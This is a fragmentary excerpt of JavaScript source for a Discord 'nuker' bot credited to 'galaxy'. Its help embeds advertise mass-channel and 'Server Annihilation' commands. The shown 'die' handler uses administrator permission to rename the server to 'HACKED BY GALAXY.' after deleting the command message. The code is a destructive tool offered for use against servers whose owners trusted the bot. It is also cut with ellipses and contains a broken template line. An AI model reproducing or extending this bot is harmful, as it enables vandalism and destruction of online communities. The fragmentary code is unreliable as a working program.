...
client.on("ready", () => {
    ...
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "PLAYING", name: prefix + 'help |by 𝒞𝐻𝒜𝑅𝒪𝒩 '}); // Delete this if you wish.
});
...
client.on("message", async message => {
    ...
    if (message.mentions.everyone === true) {
        ...
        const helpEmbed = new Discord.MessageEmbed()
            ...
            .setTitle('By : galaxy')
            .setDescription(`مهما كان سبب استدعائي ، تأكد من القيام بذلك دون أي ندم.\n\n **Nuking:**\n
            **Mass Channel:** \`${prefix}
\` [text]
            ...
            **Server Annihilation:** \`${prefix}die\` [text]
            `)
            .setThumbnail(`https://media.discordapp.net/attachments/859489339061960745/873510567862755348/Capture.PNG`)
            .setImage('https://blog.lootcrate.com/wp-content/uploads/2018/11/gc_dn_bookheader.gif')
            .setFooter(`© Presser | Prefix: ${prefix} | Author: galaxy | Cord: ${founder}`)
            .setColor(0x36393E)
    ...
    if (disableEveryone === false) {
        ...
        if (message.content.startsWith(prefix + 'help')) {
            const helpEmbed = new Discord.MessageEmbed()
                ...
                **Server Annihilation:** \`${prefix}die\` [text]
                `)
                .setImage(`https://cdn.discordapp.com/attachments/853760657835950094/853769995255283712/gd.png`)
                .setImage('https://media.discordapp.net/attachments/782211616350404611/800703659435622430/death_grips.gif')
                .setFooter(`© Presser | Prefix: ${prefix} | Author: 9wfy | Cord: ${founder}`)
                .setColor(0x36393E)
                .setTimestamp(Date.now());
            message.channel.send(helpEmbed);
            message.delete();
        ...
        if (message.content.startsWith(prefix + 'help')) {
            if (message.author.id != myID) {
                ...
                const helpEmbed = new Discord.MessageEmbed()
                    ...
                    **Server Annihilation:** \`${prefix}die\` [text]
                    `)
                    .setThumbnail(`https://cdn.discordapp.com/attachments/859489339061960745/873510567862755348/Capture.PNG`)
                    .setImage('https://media.discordapp.net/attachments/782211616350404611/800703659435622430/death_grips.gif')
                    .setFooter(`© Presser | Prefix: ${prefix} | Author: galaxy | Cord: ${founder}`)
                    .setColor(0x36393E)
                    .setTimestamp(Date.now());
    ...
    if (message.content.startsWith(prefix + 'die')) {
        if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
            ...
            if (message.author.id != myID) {
                ...
                message.delete();
                message.guild.setName(`HACKED BY GALAXY.`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
